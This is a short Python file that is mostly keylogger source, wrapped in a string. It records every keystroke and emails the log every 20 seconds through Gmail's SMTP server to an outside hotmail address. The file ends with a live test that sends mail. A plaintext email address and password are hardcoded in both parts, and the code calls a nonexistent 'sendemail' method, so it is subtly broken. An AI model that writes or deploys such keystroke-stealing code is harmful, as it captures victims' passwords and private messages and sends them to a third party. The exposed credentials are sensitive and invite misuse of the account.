'''import keyboard
import smtplib
from threading import Semaphore, Timer

SEND_REPORT_EVERY = 20
EMAIL_ADDRESS = 'zaramaluna99@gmail.com'
EMAIL_PASSWORD = 'NewGooglePassword45'


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ''
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name == 'decimal':
                name = '.'
            else:
                name = name.replace(' ', '_')
                name = f'[{name.upper()}]'

        self.log += name

    def sendemail(self, email, password, message):
        print('start')
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        print('server')
        server.starttls()
        server.login(email, password)
        print('login')
        server.sendemail(email, 'zaramaluna1999@hotmail.com', message)
        server.quit()

    def report(self):
        if self.log:
            print(self.log)
        self.sendemail(
            EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        self.log = ''
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
'''

import smtplib

EMAIL_ADDRESS = 'zaramaluna99@gmail.com'
EMAIL_PASSWORD = 'NewGooglePassword45'

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
print('login')
server.sendemail(EMAIL_ADDRESS, 'zaramaluna1999@hotmail.com', 'hola xd')
print('sended')
